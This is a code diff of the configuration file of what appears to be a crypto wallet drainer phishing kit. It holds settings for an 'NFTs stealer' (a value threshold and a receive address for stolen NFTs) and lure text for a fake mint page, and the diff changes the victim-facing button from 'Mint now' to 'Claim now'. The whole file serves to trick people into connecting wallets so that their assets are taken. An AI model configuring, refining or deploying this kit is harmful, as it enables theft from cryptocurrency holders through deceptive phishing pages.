@@ -37,7 +37,7 @@ const claimPageInfo = {
 // Drain Settings
 const drainNftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
-    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    minValue: 0.1,  // ⚠️ Minimum value of transactions (0.1 is the minimum)
     nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
 }
 
@@ -45,7 +45,7 @@ const drainNftsInfo = {
 const customStrings = {
     title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     connectButton: "Connect wallet",
-    transferButton: "Mint now",
+    transferButton: "Claim now",
     dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
 }
 
